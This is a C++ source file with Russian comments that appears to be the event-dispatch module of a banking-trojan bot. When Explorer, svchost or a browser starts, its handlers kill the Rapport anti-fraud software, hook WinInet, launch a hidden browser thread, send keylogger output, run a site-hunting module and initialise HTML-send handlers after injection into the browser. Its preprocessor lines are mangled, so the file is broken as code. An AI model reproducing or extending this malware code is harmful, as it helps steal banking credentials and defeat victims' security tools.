//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
#include "Modules.h"
#include "Loader.h"
//---------------------------------------------------------------------------


void ExplorerFirstStart(PEventData Data)
{

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef antirapportH 
		RapportOldKill();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// Первый запуск бота в проводнике

	// Запускаем удаление кукисов
	/* //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef coocksolH
		StartDeleteCookiesThread();
    //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{
	// Запущен проводника

	// Хукаем библиотеку WinInet
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef InternetExplorerH
		HookInternetExplorer();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// Запуск потока скрытого браузера.
	// ВАЖНО! Вызов должен вызываться в последнюю очередь
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// запускаем поток отвечающеий за запуск браузера
		pWaitForSingleObject(H, INFINITE);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// Запущена функция работающая в процессе svchost
	
	//Модуль охотник за сайтами , проверяет раз в 15 сек если создался мьютекс,то выполняет команду SB
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef __keylogger_h__	
		SendLoadedFiles();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HunterH
		StartHunt();		
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// Запущен Internet Explorer. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// Запущен АшкуАщч. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// Запущен известный браузер. Возникает после инжекта в процесс браузера
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HTMLSendH
		InitHTMLSendHandlers();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if;
}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// Запущено неизвестное приложение

}
//---------------------------------------------------------------------------

